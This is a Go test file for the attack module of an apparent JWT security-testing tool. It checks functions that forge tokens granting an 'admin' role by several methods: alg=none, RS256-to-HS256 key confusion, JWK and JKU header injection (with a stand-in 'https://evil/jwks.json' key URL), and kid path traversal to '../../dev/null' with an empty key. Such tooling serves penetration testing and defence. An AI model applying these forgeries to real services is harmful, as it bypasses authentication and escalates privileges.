package attack

import (
	"strings"
	"testing"

	"github.com/MRvirusIR/clavis/internal/jwt"
)

const rs = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.AAAA"

func TestAlgNoneVariants(t *testing.T) {
	tok, _ := jwt.Parse(rs)
	v := AlgNoneVariants(tok, map[string]any{"role": "admin"})
	if len(v) != 4 {
		t.Fatalf("want 4 variants, got %d", len(v))
	}
	for name, tk := range v {
		if !strings.HasSuffix(tk, ".") {
			t.Fatalf("variant %s not unsigned: %s", name, tk)
		}
		p, err := jwt.Parse(tk)
		if err != nil {
			t.Fatal(err)
		}
		if p.Claims["role"] != "admin" {
			t.Fatalf("variant %s missing role edit", name)
		}
	}
}

func TestConfuseUsesPublicKeyAsHMAC(t *testing.T) {
	tok, _ := jwt.Parse(rs)
	pub := []byte("-----BEGIN PUBLIC KEY-----\nMFwwD...fake...\n-----END PUBLIC KEY-----\n")
	out, err := Confuse(tok, pub, map[string]any{"role": "admin"}, "HS256")
	if err != nil {
		t.Fatal(err)
	}
	p, _ := jwt.Parse(out)
	if p.Alg() != "HS256" {
		t.Fatalf("alg not switched: %s", p.Alg())
	}
	if !jwt.VerifyHMAC("HS256", p.SigningInput(), pub, p.Sig) {
		t.Fatal("confused token must verify with pubkey as HMAC secret")
	}
	if p.Claims["role"] != "admin" {
		t.Fatal("role edit missing")
	}
}

func TestJWKInjectSelfSigns(t *testing.T) {
	tok, _ := jwt.Parse(rs)
	out, priv, err := JWKInject(tok, map[string]any{"role": "admin"}, 2048)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(priv, "RSA PRIVATE KEY") {
		t.Fatal("expected a private key PEM")
	}
	p, _ := jwt.Parse(out)
	if _, ok := p.Header["jwk"]; !ok {
		t.Fatal("no jwk in header")
	}
	if p.Claims["role"] != "admin" {
		t.Fatal("role edit missing")
	}
}

func TestJKUInjectEmitsJWKS(t *testing.T) {
	tok, _ := jwt.Parse(rs)
	out, jwks, priv, err := JKUInject(tok, map[string]any{"role": "admin"}, "https://evil/jwks.json", 2048)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(jwks, "\"keys\"") || !strings.Contains(jwks, "\"kid\": \"clavis\"") {
		t.Fatalf("jwks malformed: %s", jwks)
	}
	if !strings.Contains(priv, "RSA PRIVATE KEY") {
		t.Fatal("expected private key PEM")
	}
	p, _ := jwt.Parse(out)
	if p.Header["jku"] != "https://evil/jwks.json" {
		t.Fatalf("jku = %v", p.Header["jku"])
	}
}

func TestKidInjectEmptyKey(t *testing.T) {
	tok, _ := jwt.Parse(rs)
	out, err := KidInject(tok, map[string]any{"role": "admin"}, "../../dev/null", "", "HS256")
	if err != nil {
		t.Fatal(err)
	}
	p, _ := jwt.Parse(out)
	if p.Header["kid"] != "../../dev/null" {
		t.Fatalf("kid = %v", p.Header["kid"])
	}
	if !jwt.VerifyHMAC("HS256", p.SigningInput(), []byte(""), p.Sig) {
		t.Fatal("kid token must verify with empty key")
	}
}
